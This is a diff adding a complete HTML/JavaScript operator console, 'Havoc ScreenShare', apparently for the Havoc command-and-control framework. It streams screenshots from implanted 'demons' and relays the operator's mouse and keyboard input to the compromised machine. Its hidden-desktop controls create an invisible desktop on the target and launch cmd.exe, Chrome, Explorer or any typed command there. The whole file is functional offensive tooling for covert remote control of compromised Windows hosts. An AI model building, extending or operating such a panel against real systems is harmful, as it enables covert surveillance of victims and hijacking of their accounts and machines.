@@ -1,0 +1,698 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Havoc ScreenShare</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#08080e;color:#c0c8d0;font-family:'Segoe UI',system-ui,-apple-system,sans-serif;font-size:13px;height:100vh;display:flex;flex-direction:column;overflow:hidden}
+
+/* Toolbar */
+.toolbar{background:#101018;border-bottom:1px solid #1e1e2e;padding:5px 10px;display:flex;gap:6px;align-items:center;flex-wrap:wrap;min-height:38px}
+.toolbar select{background:#16161f;border:1px solid #2a2a3a;color:#d0d0e0;padding:4px 8px;border-radius:4px;font:inherit;font-size:12px;cursor:pointer;min-width:150px;outline:none}
+.toolbar select:focus{border-color:#7c3aed}
+.tb-btn{display:inline-flex;align-items:center;gap:4px;border:1px solid #2a2a3a;padding:4px 10px;border-radius:4px;font:inherit;font-size:11px;cursor:pointer;transition:all .15s;background:#16161f;color:#808898;white-space:nowrap}
+.tb-btn:hover{background:#1e1e2e;color:#d0d8e0}
+.tb-btn.active{background:#1a1a30;color:#a78bfa;border-color:#3a3a5a}
+.btn-start{background:#0f2a15;color:#4ade80;border-color:#1a4a25}
+.btn-start:hover{background:#153520;color:#6ee7a0}
+.btn-stop{background:#2a0f0f;color:#f87171;border-color:#4a1a1a}
+.btn-stop:hover{background:#351515;color:#fca5a5}
+.btn-shot{background:#1f0f2a;color:#c084fc;border-color:#30204a}
+.btn-shot:hover{background:#2a1535}
+.sep{width:1px;height:20px;background:#1e1e2e;flex-shrink:0}
+.toolbar .status{margin-left:auto;font-size:11px;color:#505868;white-space:nowrap}
+.toolbar .status.live{color:#4ade80}
+
+/* Zoom controls */
+.zoom-group{display:flex;align-items:center;gap:2px}
+.zoom-group .tb-btn{padding:4px 7px;min-width:0;font-size:12px}
+.zoom-label{font-size:10px;color:#505868;min-width:36px;text-align:center;font-variant-numeric:tabular-nums}
+
+/* Hidden desktop controls */
+.hd-group{display:flex;align-items:center;gap:2px}
+.btn-hd{background:#0f1a2a;color:#60a5fa;border-color:#1a3050}
+.btn-hd:hover{background:#152540;color:#93c5fd}
+
+/* Screen area */
+.screen-area{flex:1;background:#000;display:flex;align-items:center;justify-content:center;overflow:auto;position:relative;user-select:none;cursor:crosshair}
+.screen-area img{display:block}
+.screen-area .placeholder{color:#252535;font-size:15px;text-align:center;line-height:2.2;pointer-events:none}
+.screen-area .placeholder .sub{font-size:12px;color:#181825}
+
+/* Click ripple */
+.click-ripple{position:absolute;width:24px;height:24px;border-radius:50%;border:2px solid #7c3aed;pointer-events:none;animation:ripple-out .4s ease-out forwards;z-index:10}
+@keyframes ripple-out{0%{transform:translate(-50%,-50%) scale(.5);opacity:1}100%{transform:translate(-50%,-50%) scale(2);opacity:0}}
+
+/* Keyboard hint overlay */
+.kbd-hint{position:absolute;bottom:12px;right:12px;background:rgba(16,16,24,.85);border:1px solid #2a2a3a;border-radius:6px;padding:6px 10px;font-size:10px;color:#606878;pointer-events:none;opacity:0;transition:opacity .3s;z-index:5}
+.kbd-hint.visible{opacity:1}
+.kbd-hint kbd{background:#1a1a28;border:1px solid #2a2a3a;border-radius:3px;padding:1px 4px;font-family:inherit;font-size:10px;color:#808898}
+
+/* Info bar */
+.info-bar{background:#101018;border-top:1px solid #1e1e2e;padding:4px 10px;font-size:10px;color:#3a4050;display:flex;gap:14px;align-items:center;flex-wrap:wrap;min-height:24px}
+.info-bar span{display:flex;align-items:center;gap:4px;white-space:nowrap}
+.info-bar .dot{width:6px;height:6px;border-radius:50%;display:inline-block;flex-shrink:0}
+.info-bar .dot.on{background:#4ade80}
+.info-bar .dot.off{background:#404858}
+.info-bar .latency-good{color:#4ade80}
+.info-bar .latency-ok{color:#facc15}
+.info-bar .latency-bad{color:#f87171}
+.info-bar .credit{margin-left:auto;color:#2a3040;font-size:10px}
+.info-bar .credit a{color:#3a4060;text-decoration:none}
+.info-bar .credit a:hover{color:#606880}
+
+@media(max-width:600px){
+  .toolbar{padding:4px 6px;gap:4px}
+  .tb-btn{padding:3px 6px;font-size:10px}
+  .sep{display:none}
+  .zoom-group{display:none}
+  .hd-group{display:none}
+  .info-bar{gap:8px;padding:3px 6px}
+}
+</style>
+</head>
+<body>
+
+<div class="toolbar" id="toolbar">
+  <select id="demonSel"><option value="">-- select demon --</option></select>
+  <button class="tb-btn btn-start" onclick="HVS.startStream()" title="Start streaming">&#9654; Stream</button>
+  <button class="tb-btn btn-stop" onclick="HVS.stopStream()" title="Stop streaming">&#9632; Stop</button>
+  <button class="tb-btn btn-shot" onclick="HVS.takeShot()" title="Single screenshot">&#128247; Shot</button>
+  <div class="sep"></div>
+  <div class="zoom-group">
+    <button class="tb-btn" onclick="HVS.zoomOut()" title="Zoom out">&#8722;</button>
+    <span class="zoom-label" id="zoomLabel">Fit</span>
+    <button class="tb-btn" onclick="HVS.zoomIn()" title="Zoom in">&#43;</button>
+    <button class="tb-btn" id="btnFit" onclick="HVS.zoomFit()" title="Fit to window">&#8596; Fit</button>
+    <button class="tb-btn" onclick="HVS.zoom1to1()" title="1:1 actual size">1:1</button>
+  </div>
+  <div class="sep"></div>
+  <button class="tb-btn" onclick="HVS.toggleFullscreen()" title="Toggle fullscreen">&#9974; Fullscreen</button>
+  <button class="tb-btn" onclick="HVS.popout()" title="Open in new window">&#8599; Popout</button>
+  <div class="sep"></div>
+  <div class="hd-group">
+    <button class="tb-btn btn-hd" onclick="HVS.hdCreate()" title="Create hidden desktop">&#128065; Hidden Desktop</button>
+    <button class="tb-btn" onclick="HVS.hdRun('cmd.exe')" title="Launch CMD">CMD</button>
+    <button class="tb-btn" onclick="HVS.hdRun('explorer.exe')" title="Launch Explorer">Explorer</button>
+    <button class="tb-btn" onclick="HVS.hdRun('chrome.exe')" title="Launch Chrome">Chrome</button>
+    <button class="tb-btn" onclick="HVS.hdRunCustom()" title="Launch custom process">Run...</button>
+    <button class="tb-btn btn-stop" onclick="HVS.hdClose()" title="Close hidden desktop">&#10005; Close HD</button>
+  </div>
+  <span class="status" id="status">Idle</span>
+</div>
+
+<div class="screen-area fit" id="screenArea" tabindex="0">
+  <img id="screenImg" style="display:none" draggable="false">
+  <div class="placeholder" id="placeholder">
+    Select a demon and click Stream to begin<br>
+    <span class="sub">Mouse clicks and keyboard input are relayed to the target</span>
+  </div>
+  <div class="kbd-hint" id="kbdHint"><kbd>Keyboard</kbd> input is captured while viewer has focus</div>
+</div>
+
+<div class="info-bar" id="infoBar">
+  <span><span class="dot off" id="connDot"></span> <span id="connText">Disconnected</span></span>
+  <span id="resolution">-</span>
+  <span id="fpsDisplay">-</span>
+  <span id="frameSize">-</span>
+  <span id="latency">-</span>
+  <span class="credit">Havoc ScreenShare by <a href="https://github.com/dhanushdarvind" target="_blank" rel="noopener">Dhanush Gowda</a></span>
+</div>
+
+<script>
+(function(){
+  'use strict';
+
+  var API = window.location.origin;
+  var activeDemon = '';
+  var zoomLevel = 0;
+  var isFullscreen = false;
+  var lastMtime = 0;
+
+  var frameTimes = [];
+  var fpsInterval = null;
+  var lastFrameBytes = 0;
+
+  var latencyMs = 0;
+
+  var $sel, $img, $ph, $status, $connDot, $connText, $res, $fps, $fsize, $lat, $area, $kbdHint, $zoomLabel;
+
+  function $(id){ return document.getElementById(id); }
+
+  function init(){
+    $sel = $('demonSel');
+    $img = $('screenImg');
+    $ph = $('placeholder');
+    $status = $('status');
+    $connDot = $('connDot');
+    $connText = $('connText');
+    $res = $('resolution');
+    $fps = $('fpsDisplay');
+    $fsize = $('frameSize');
+    $lat = $('latency');
+    $area = $('screenArea');
+    $kbdHint = $('kbdHint');
+    $zoomLabel = $('zoomLabel');
+
+    refreshDemons();
+    setInterval(refreshDemons, 5000);
+
+    fpsInterval = setInterval(updateFps, 1000);
+
+    setupInput();
+    setupKbdHint();
+
+    window.addEventListener('resize', resizeImage);
+  }
+
+  // ── Demon list ──
+
+  function refreshDemons(){
+    fetch(API + '/api/demons').then(function(r){ return r.json(); }).then(function(list){
+      var prev = $sel.value;
+      $sel.innerHTML = '<option value="">-- select demon --</option>';
+      list.forEach(function(d){
+        var opt = document.createElement('option');
+        opt.value = d.id;
+        var label = d.id;
+        if(d.streaming) label += ' [live]';
+        if(d.hidden_desktop) label += ' [HD]';
+        opt.textContent = label;
+        if(d.id === prev) opt.selected = true;
+        $sel.appendChild(opt);
+      });
+    }).catch(function(){});
+  }
+
+  // ── FPS calculation ──
+
+  function updateFps(){
+    var now = performance.now();
+    while(frameTimes.length > 0 && now - frameTimes[0] > 2000) frameTimes.shift();
+    if(frameTimes.length < 2){
+      $fps.textContent = activeDemon ? '0 fps' : '-';
+      return;
+    }
+    var elapsed = (frameTimes[frameTimes.length - 1] - frameTimes[0]) / 1000;
+    var fps = elapsed > 0 ? ((frameTimes.length - 1) / elapsed) : 0;
+    $fps.textContent = fps.toFixed(1) + ' fps';
+  }
+
+  // ── Long-poll frame fetching ──
+
+  async function longPollFrame(){
+    if(!activeDemon) return;
+    var t0 = performance.now();
+    try {
+      var url = API + '/api/frame/' + activeDemon + '?after=' + lastMtime;
+      var r = await fetch(url);
+      if(r.status === 304){
+        requestAnimationFrame(longPollFrame);
+        return;
+      }
+      if(!r.ok) throw new Error('no frame');
+      var mt = r.headers.get('X-Frame-Time');
+      if(mt) lastMtime = parseFloat(mt);
+      lastFrameBytes = parseInt(r.headers.get('Content-Length') || '0', 10);
+      var blob = await r.blob();
+      latencyMs = performance.now() - t0;
+      var objUrl = URL.createObjectURL(blob);
+      var prev = $img.src;
+      $img.src = objUrl;
+      if(prev && prev.startsWith('blob:')) URL.revokeObjectURL(prev);
+      frameTimes.push(performance.now());
+      if(frameTimes.length > 60) frameTimes.shift();
+      $fsize.textContent = lastFrameBytes > 0 ? (lastFrameBytes / 1024).toFixed(1) + ' KB' : '-';
+      updateLatency();
+    } catch(e) {
+      await new Promise(function(resolve){ setTimeout(resolve, 200); });
+    }
+    requestAnimationFrame(longPollFrame);
+  }
+
+  // ── Stream control ──
+
+  function startStream(){
+    var did = $sel.value;
+    if(!did){ alert('Select a demon first'); return; }
+    activeDemon = did;
+    lastMtime = 0;
+    $ph.style.display = 'none';
+    $img.style.display = 'block';
+    $status.textContent = 'Streaming: ' + did;
+    $status.className = 'status live';
+    $connDot.className = 'dot on';
+    $connText.textContent = 'Connected';
+    frameTimes = [];
+    longPollFrame();
+    $area.focus();
+  }
+
+  function stopStream(){
+    activeDemon = '';
+    $img.style.display = 'none';
+    $ph.style.display = '';
+    $status.textContent = 'Idle';
+    $status.className = 'status';
+    $connDot.className = 'dot off';
+    $connText.textContent = 'Disconnected';
+    $fps.textContent = '-';
+    $fsize.textContent = '-';
+    $res.textContent = '-';
+    $lat.textContent = '-';
+    frameTimes = [];
+  }
+
+  function takeShot(){
+    var did = $sel.value;
+    if(!did){ alert('Select a demon first'); return; }
+    activeDemon = did;
+    lastMtime = 0;
+    $ph.style.display = 'none';
+    $img.style.display = 'block';
+    longPollFrame();
+    $status.textContent = 'Screenshot: ' + did;
+  }
+
+  // ── Latency display ──
+
+  function updateLatency(){
+    var ms = Math.round(latencyMs);
+    var cls = ms < 100 ? 'latency-good' : ms < 300 ? 'latency-ok' : 'latency-bad';
+    $lat.innerHTML = '<span class="' + cls + '">' + ms + 'ms</span>';
+  }
+
+  // ── Image sizing ──
+
+  function resizeImage(){
+    var nw = $img.naturalWidth;
+    var nh = $img.naturalHeight;
+    if(!nw || !nh) return;
+
+    if(zoomLevel === 0){
+      var ar = $area.getBoundingClientRect();
+      var scale = Math.min(ar.width / nw, ar.height / nh);
+      $img.style.width = Math.floor(nw * scale) + 'px';
+      $img.style.height = Math.floor(nh * scale) + 'px';
+      $zoomLabel.textContent = 'Fit';
+    } else {
+      var scale = zoomLevel / 100;
+      $img.style.width = Math.round(nw * scale) + 'px';
+      $img.style.height = Math.round(nh * scale) + 'px';
+      $zoomLabel.textContent = zoomLevel + '%';
+    }
+  }
+
+  function zoomIn(){
+    if(zoomLevel === 0){
+      var nw = $img.naturalWidth || 1920;
+      var rect = $area.getBoundingClientRect();
+      var fitScale = Math.min(rect.width / nw, rect.height / ($img.naturalHeight || 1080));
+      zoomLevel = Math.round(fitScale * 100);
+    }
+    zoomLevel = Math.min(400, zoomLevel + 25);
+    resizeImage();
+  }
+
+  function zoomOut(){
+    if(zoomLevel === 0) return;
+    zoomLevel = Math.max(25, zoomLevel - 25);
+    resizeImage();
+  }
+
+  function zoomFit(){
+    zoomLevel = 0;
+    resizeImage();
+  }
+
+  function zoom1to1(){
+    zoomLevel = 100;
+    resizeImage();
+  }
+
+  // ── Fullscreen ──
+
+  function toggleFullscreen(){
+    if(!document.fullscreenElement){
+      $area.requestFullscreen().catch(function(){});
+    } else {
+      document.exitFullscreen().catch(function(){});
+    }
+  }
+
+  // ── Coordinate mapping ──
+
+  function getCoords(e){
+    var r = $img.getBoundingClientRect();
+    var nw = $img.naturalWidth || 1;
+    var nh = $img.naturalHeight || 1;
+    var x = Math.round((e.clientX - r.left) / r.width * nw);
+    var y = Math.round((e.clientY - r.top) / r.height * nh);
+    return {
+      x: Math.max(0, Math.min(nw - 1, x)),
+      y: Math.max(0, Math.min(nh - 1, y))
+    };
+  }
+
+  // ── Click ripple effect ──
+
+  function showRipple(e){
+    var rip = document.createElement('div');
+    rip.className = 'click-ripple';
+    rip.style.left = e.clientX + 'px';
+    rip.style.top = e.clientY + 'px';
+    $area.appendChild(rip);
+    setTimeout(function(){ rip.remove(); }, 400);
+  }
+
+  // ── Send input ──
+
+  function sendInput(data){
+    if(!activeDemon) return;
+    data.demon_id = activeDemon;
+    fetch(API + '/api/input', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(data)
+    }).catch(function(){});
+  }
+
+  // ── Input setup ──
+
+  var EXTENDED_KEYS = {
+    33:1,34:1,
+    35:1,36:1,
+    37:1,38:1,39:1,40:1,
+    44:1,
+    45:1,46:1,
+    91:1,92:1,93:1,
+    111:1,
+    144:1
+  };
+
+  function getExtFlags(e){
+    /* Right Ctrl/Alt are extended keys (E0 prefix).
+       Right Shift (keyCode 16) is NOT extended. */
+    if(e.location === 2 && e.keyCode !== 16) return 1;
+    if(e.keyCode === 13 && e.location === 3) return 1;
+    return EXTENDED_KEYS[e.keyCode] ? 1 : 0;
+  }
+
+  var _dblClickTime = 0;
+  var _lastMouseX = 0, _lastMouseY = 0;
+  var _drag = {state:'idle', btn:0, sx:0, sy:0};
+  var _suppressClick = false;
+  var _moveThrottle = null;
+  var _pendingMove = null;
+
+  function sendThrottledMove(x, y){
+    if(_moveThrottle){
+      _pendingMove = {x:x, y:y};
+      return;
+    }
+    sendInput({input_type:'mouse', action:'move', x:x, y:y});
+    _pendingMove = null;
+    _moveThrottle = setTimeout(function(){
+      _moveThrottle = null;
+      if(_pendingMove){
+        sendInput({input_type:'mouse', action:'move', x:_pendingMove.x, y:_pendingMove.y});
+        _pendingMove = null;
+      }
+    }, 30);
+  }
+
+  function setupInput(){
+    /* Mouse down: begin tracking for click vs drag */
+    $area.addEventListener('mousedown', function(e){
+      if(!activeDemon || $img.style.display === 'none') return;
+      e.preventDefault();
+      $area.focus();
+      var c = getCoords(e);
+      _lastMouseX = c.x; _lastMouseY = c.y;
+      _drag = {state:'pending', btn:e.button, sx:c.x, sy:c.y};
+      _suppressClick = false;
+    });
+
+    /* Mouse move: drag tracking + throttled cursor sync */
+    $area.addEventListener('mousemove', function(e){
+      if(!activeDemon || $img.style.display === 'none') return;
+      var c = getCoords(e);
+      _lastMouseX = c.x; _lastMouseY = c.y;
+      if(_drag.state === 'pending'){
+        var dx = Math.abs(c.x - _drag.sx);
+        var dy = Math.abs(c.y - _drag.sy);
+        if(dx > 3 || dy > 3){
+          _drag.state = 'dragging';
+          _suppressClick = true;
+          var act = _drag.btn === 2 ? 'rightdown' : 'down';
+          sendInput({input_type:'mouse', action:act, x:_drag.sx, y:_drag.sy});
+        }
+      }
+      if(_drag.state === 'dragging'){
+        sendThrottledMove(c.x, c.y);
+      }
+    });
+
+    /* Mouse up: end drag or let click fire */
+    $area.addEventListener('mouseup', function(e){
+      if(!activeDemon || $img.style.display === 'none') return;
+      var c = getCoords(e);
+      _lastMouseX = c.x; _lastMouseY = c.y;
+      if(_drag.state === 'dragging'){
+        var act = _drag.btn === 2 ? 'rightup' : 'up';
+        sendInput({input_type:'mouse', action:act, x:c.x, y:c.y});
+      }
+      _drag.state = 'idle';
+    });
+
+    /* Left click (suppressed if we just finished a drag or dblclick) */
+    $area.addEventListener('click', function(e){
+      if(!activeDemon || $img.style.display === 'none') return;
+      if(_suppressClick){ _suppressClick = false; return; }
+      if(Date.now() - _dblClickTime < 400) return;
+      var c = getCoords(e);
+      sendInput({input_type:'mouse', action:'click', x:c.x, y:c.y});
+      showRipple(e);
+    });
+
+    /* Right click */
+    $area.addEventListener('contextmenu', function(e){
+      e.preventDefault();
+      if(!activeDemon || $img.style.display === 'none') return;
+      if(_suppressClick){ _suppressClick = false; return; }
+      var c = getCoords(e);
+      sendInput({input_type:'mouse', action:'rightclick', x:c.x, y:c.y});
+      showRipple(e);
+    });
+
+    /* Double click — sends atomic dblclick action (BOF handles timing) */
+    $area.addEventListener('dblclick', function(e){
+      if(!activeDemon || $img.style.display === 'none') return;
+      _dblClickTime = Date.now();
+      _suppressClick = true;
+      var c = getCoords(e);
+      sendInput({input_type:'mouse', action:'dblclick', x:c.x, y:c.y});
+    });
+
+    /* Scroll wheel */
+    $area.addEventListener('wheel', function(e){
+      if(!activeDemon || $img.style.display === 'none') return;
+      e.preventDefault();
+      var c = getCoords(e);
+      var delta = -Math.sign(e.deltaY) * 120;
+      sendInput({input_type:'mouse', action:'scroll', x:c.x, y:c.y, keycode:delta});
+    }, {passive:false});
+
+    /* Keyboard down */
+    document.addEventListener('keydown', function(e){
+      if(!activeDemon) return;
+      if(e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT') return;
+      if($area.contains(document.activeElement) || document.activeElement === document.body){
+        e.preventDefault();
+        e.stopPropagation();
+        sendInput({input_type:'keyboard', action:'down',
+          keycode:e.keyCode, flags:getExtFlags(e),
+          x:_lastMouseX, y:_lastMouseY});
+      }
+    });
+
+    /* Keyboard up */
+    document.addEventListener('keyup', function(e){
+      if(!activeDemon) return;
+      if(e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT') return;
+      if($area.contains(document.activeElement) || document.activeElement === document.body){
+        e.preventDefault();
+        e.stopPropagation();
+        sendInput({input_type:'keyboard', action:'up',
+          keycode:e.keyCode, flags:getExtFlags(e),
+          x:_lastMouseX, y:_lastMouseY});
+      }
+    });
+  }
+
+  // ── Keyboard hint ──
+
+  function setupKbdHint(){
+    $area.addEventListener('focus', function(){
+      if(activeDemon) $kbdHint.classList.add('visible');
+    });
+    $area.addEventListener('blur', function(){
+      $kbdHint.classList.remove('visible');
+    });
+    $area.addEventListener('click', function(){
+      if(activeDemon){
+        $kbdHint.classList.add('visible');
+        setTimeout(function(){ $kbdHint.classList.remove('visible'); }, 3000);
+      }
+    });
+  }
+
+  // ── Image onload for resolution ──
+
+  function onImgLoad(){
+    $res.textContent = $img.naturalWidth + 'x' + $img.naturalHeight;
+    resizeImage();
+  }
+
+  // ── Hidden Desktop controls ──
+
+  function hdCreate(){
+    var did = $sel.value;
+    if(!did){ alert('Select a demon first'); return; }
+    fetch(API + '/api/hdesktop', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({demon_id: did, action: 'create', cmd: 'explorer.exe'})
+    }).then(function(r){ return r.json(); }).then(function(){
+      $status.textContent = 'Hidden desktop created';
+    }).catch(function(){});
+  }
+
+  function hdRun(cmd){
+    var did = $sel.value || activeDemon;
+    if(!did){ alert('Select a demon first'); return; }
+    fetch(API + '/api/hdesktop', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({demon_id: did, action: 'run', cmd: cmd})
+    }).catch(function(){});
+  }
+
+  function hdRunCustom(){
+    var cmd = prompt('Enter command to run on hidden desktop:', 'notepad.exe');
+    if(cmd) hdRun(cmd);
+  }
+
+  function hdClose(){
+    var did = $sel.value || activeDemon;
+    if(!did) return;
+    fetch(API + '/api/hdesktop', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({demon_id: did, action: 'close'})
+    }).then(function(){
+      $status.textContent = 'Hidden desktop closed';
+    }).catch(function(){});
+  }
+
+  // ── Popout ──
+
+  function popout(){
+    if(!activeDemon){ alert('Start streaming first'); return; }
+    var did = activeDemon;
+    var w = window.open('', 'HavocScreen_' + did, 'width=1280,height=720');
+    if(!w) return;
+    var html = '<!DOCTYPE html><html><head><meta charset="utf-8">'
+      + '<title>Havoc Screen - ' + did + '</title>'
+      + '<style>'
+      + '*{margin:0;padding:0;box-sizing:border-box}'
+      + 'body{background:#000;overflow:hidden;font-family:system-ui,sans-serif}'
+      + '.wrap{width:100vw;height:100vh;display:flex;align-items:center;justify-content:center;cursor:crosshair;position:relative;user-select:none}'
+      + 'img{max-width:100%;max-height:100%;object-fit:contain;display:block}'
+      + '.click-ripple{position:absolute;width:24px;height:24px;border-radius:50%;border:2px solid #7c3aed;pointer-events:none;animation:rip .4s ease-out forwards}'
+      + '@keyframes rip{0%{transform:translate(-50%,-50%) scale(.5);opacity:1}100%{transform:translate(-50%,-50%) scale(2);opacity:0}}'
+      + '.bar{position:fixed;bottom:0;left:0;right:0;background:rgba(8,8,14,.8);padding:4px 10px;font-size:10px;color:#404858;display:flex;gap:12px;align-items:center}'
+      + '.bar .g{color:#4ade80}.bar .y{color:#facc15}.bar .r{color:#f87171}'
+      + '</style></head><body>'
+      + '<div class="wrap" id="w"><img id="si" draggable="false"></div>'
+      + '<div class="bar"><span id="st">Connecting...</span><span id="fp">-</span><span id="lt">-</span><span style="margin-left:auto;color:#2a3040">Havoc ScreenShare by Dhanush Gowda</span></div>'
+      + '<script>'
+      + 'var did="' + did + '",api="' + API + '",ft=[],lat=0,lm=0,active=true;'
+      + 'var img=document.getElementById("si"),w=document.getElementById("w");'
+      + 'async function poll(){'
+      + '  if(!active)return;'
+      + '  var t0=performance.now();'
+      + '  try{'
+      + '    var r=await fetch(api+"/api/frame/"+did+"?after="+lm);'
+      + '    if(r.status===304){requestAnimationFrame(poll);return;}'
+      + '    if(!r.ok)throw 0;'
+      + '    var mt=r.headers.get("X-Frame-Time");'
+      + '    if(mt)lm=parseFloat(mt);'
+      + '    var b=await r.blob();'
+      + '    lat=performance.now()-t0;'
+      + '    var u=URL.createObjectURL(b),p=img.src;img.src=u;if(p&&p.startsWith("blob:"))URL.revokeObjectURL(p);'
+      + '    ft.push(performance.now());if(ft.length>60)ft.shift();'
+      + '    document.getElementById("st").textContent="Streaming: "+did;'
+      + '    document.getElementById("st").className="g";'
+      + '  }catch(e){await new Promise(function(r){setTimeout(r,200)});}'
+      + '  requestAnimationFrame(poll);'
+      + '}'
+      + 'poll();'
+      + 'setInterval(function(){'
+      + '  var now=performance.now();while(ft.length&&now-ft[0]>2000)ft.shift();'
+      + '  var fps=ft.length>1?((ft.length-1)/((ft[ft.length-1]-ft[0])/1000)):0;'
+      + '  document.getElementById("fp").textContent=fps.toFixed(1)+" fps";'
+      + '  var ms=Math.round(lat),c=ms<100?"g":ms<300?"y":"r";'
+      + '  document.getElementById("lt").innerHTML="<span class=\\""+c+"\\">"+ms+"ms</span>";'
+      + '},1000);'
+      + 'function gc(e){var r=img.getBoundingClientRect(),nw=img.naturalWidth||1,nh=img.naturalHeight||1;return{x:Math.max(0,Math.min(nw-1,Math.round((e.clientX-r.left)/r.width*nw))),y:Math.max(0,Math.min(nh-1,Math.round((e.clientY-r.top)/r.height*nh)))};}'
+      + 'function si(d){d.demon_id=did;fetch(api+"/api/input",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(d)}).catch(function(){});}'
+      + 'function rip(e){var r=document.createElement("div");r.className="click-ripple";r.style.left=e.clientX+"px";r.style.top=e.clientY+"px";w.appendChild(r);setTimeout(function(){r.remove()},400);}'
+      + 'var lmx=0,lmy=0;'
+      + 'w.addEventListener("click",function(e){var c=gc(e);lmx=c.x;lmy=c.y;si({input_type:"mouse",action:"click",x:c.x,y:c.y});rip(e);});'
+      + 'w.addEventListener("contextmenu",function(e){e.preventDefault();var c=gc(e);lmx=c.x;lmy=c.y;si({input_type:"mouse",action:"rightclick",x:c.x,y:c.y});rip(e);});'
+      + 'w.addEventListener("dblclick",function(e){var c=gc(e);lmx=c.x;lmy=c.y;si({input_type:"mouse",action:"dblclick",x:c.x,y:c.y});});'
+      + 'w.addEventListener("mousemove",function(e){var c=gc(e);lmx=c.x;lmy=c.y;});'
+      + 'w.addEventListener("wheel",function(e){e.preventDefault();var c=gc(e);si({input_type:"mouse",action:"scroll",x:c.x,y:c.y,keycode:-Math.sign(e.deltaY)*120});},{passive:false});'
+      + 'var EK={33:1,34:1,35:1,36:1,37:1,38:1,39:1,40:1,44:1,45:1,46:1,91:1,92:1,93:1,111:1,144:1};'
+      + 'function ef(e){if(e.location===2)return 1;if(e.keyCode===13&&e.location===3)return 1;return EK[e.keyCode]?1:0;}'
+      + 'document.addEventListener("keydown",function(e){e.preventDefault();si({input_type:"keyboard",action:"down",keycode:e.keyCode,flags:ef(e),x:lmx,y:lmy});});'
+      + 'document.addEventListener("keyup",function(e){e.preventDefault();si({input_type:"keyboard",action:"up",keycode:e.keyCode,flags:ef(e),x:lmx,y:lmy});});'
+      + '<\/script></body></html>';
+    w.document.write(html);
+    w.document.close();
+  }
+
+  // ── Expose public API ──
+
+  window.HVS = {
+    startStream: startStream,
+    stopStream: stopStream,
+    takeShot: takeShot,
+    zoomIn: zoomIn,
+    zoomOut: zoomOut,
+    zoomFit: zoomFit,
+    zoom1to1: zoom1to1,
+    toggleFullscreen: toggleFullscreen,
+    popout: popout,
+    hdCreate: hdCreate,
+    hdRun: hdRun,
+    hdRunCustom: hdRunCustom,
+    hdClose: hdClose
+  };
+
+  if(document.readyState === 'loading'){
+    document.addEventListener('DOMContentLoaded', function(){
+      init();
+      $img.addEventListener('load', onImgLoad);
+    });
+  } else {
+    init();
+    $img.addEventListener('load', onImgLoad);
+  }
+})();
+</script>
+</body>
+</html>
